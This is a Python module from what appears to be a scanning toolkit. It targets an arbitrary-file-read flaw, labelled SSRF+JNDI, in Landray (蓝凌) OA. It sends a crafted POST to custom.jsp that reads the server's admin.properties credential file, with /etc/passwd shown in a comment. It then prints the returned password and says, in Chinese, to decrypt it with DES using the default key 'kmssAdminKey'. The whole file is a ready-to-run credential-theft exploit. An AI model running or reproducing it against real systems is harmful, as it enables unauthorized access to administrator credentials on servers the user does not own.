#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests
import urllib3
from libs.public.outprint import OutPrintInfo
from libs.public.reqset import ReqSet

urllib3.disable_warnings()

class LanlingSsrfJndiScan:
    def __init__(self):
        self.proxy = None
        self.header = None
        self.ssl = None

    def run(self,url,data):
        # data = "var={“body”:{“file”:”file:///etc/passwd”}}"
        header = {
            'User-Agent': self.header,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept-Encoding': 'gzip'
        }
        try:
            response = requests.post(url, headers=header, data=data, timeout=5, verify=self.ssl, proxies=self.proxy)
            response.encoding = response.apparent_encoding
            if response.status_code == 200 and 'password' in response.text:
            # if response.status_code == 200:
                OutPrintInfo("LanLing",f"存在蓝凌 OA SSRF+JNDI 远程命令执行:[b red]{url}[/b red]")
                OutPrintInfo("LanLing",f"请求体:")
                print(response.text)
                OutPrintInfo("LanLing",'kmss.properties.encrypt.enabled时密码是加密后的')
                OutPrintInfo("LanLing",'获取password后，使用 DES方法 解密，默认密钥为 [b red]kmssAdminKey[/b red]')
            else:
                OutPrintInfo("LanLing", "目标不存在该漏洞")
        except Exception:
            OutPrintInfo("LanLing", "目标不存在该漏洞")
    def main(self, results):
        url = results[0].strip('/ ')
        self.ssl = results[1]
        self.header = results[2]
        proxy = results[3]
        reqset = ReqSet(proxy=proxy)
        self.proxy = reqset["proxy"]
        OutPrintInfo("LanLing","开始检测蓝凌 OA SSRF+JNDI 远程命令执行......")
        new_url = url + "/sys/ui/extend/varkind/custom.jsp"
        data_list = 'var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}'

        self.run(new_url,data_list)

        OutPrintInfo("LanLing","蓝凌 OA SSRF+JNDI 远程命令执行检测结束")